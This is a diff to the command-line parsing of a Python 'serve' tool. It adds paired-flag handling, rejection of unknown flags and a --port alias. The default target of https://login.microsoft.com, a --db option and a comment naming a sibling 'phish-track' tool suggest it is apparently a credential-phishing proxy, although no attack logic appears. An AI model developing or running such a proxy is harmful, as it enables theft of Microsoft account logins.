@@ -257,7 +257,18 @@ if __name__ == '__main__':
     if len(sys.argv) < 2 or sys.argv[1] not in ('serve',):
         print(__doc__); sys.exit(2)
     if sys.argv[1] == 'serve':
-        listen = '--listen' in sys.argv and sys.argv[sys.argv.index('--listen') + 1] or ':8080'
-        target = '--target' in sys.argv and sys.argv[sys.argv.index('--target') + 1] or 'https://login.microsoft.com'
-        db = '--db' in sys.argv and sys.argv[sys.argv.index('--db') + 1] or None
+        # R32D92-N1: 成对解析+未知旗标拒 rc=2(此前静默忽略)+--port 别名
+        # (族内 phish-track 用 --port, 两形并收消不一致)。
+        PAIR_FLAGS = ('--listen', '--port', '--target', '--db')
+        toks, flags = sys.argv[2:], {}
+        i = 0
+        while i < len(toks):
+            t = toks[i]
+            if t in PAIR_FLAGS and i + 1 < len(toks):
+                flags[t] = toks[i + 1]; i += 2
+            else:
+                print(f'未知/缺值参数: {t}(用法: -h)', file=sys.stderr); sys.exit(2)
+        listen = flags.get('--listen') or (':' + flags['--port'] if '--port' in flags else ':8080')
+        target = flags.get('--target') or 'https://login.microsoft.com'
+        db = flags.get('--db')
         serve(listen, target, db)
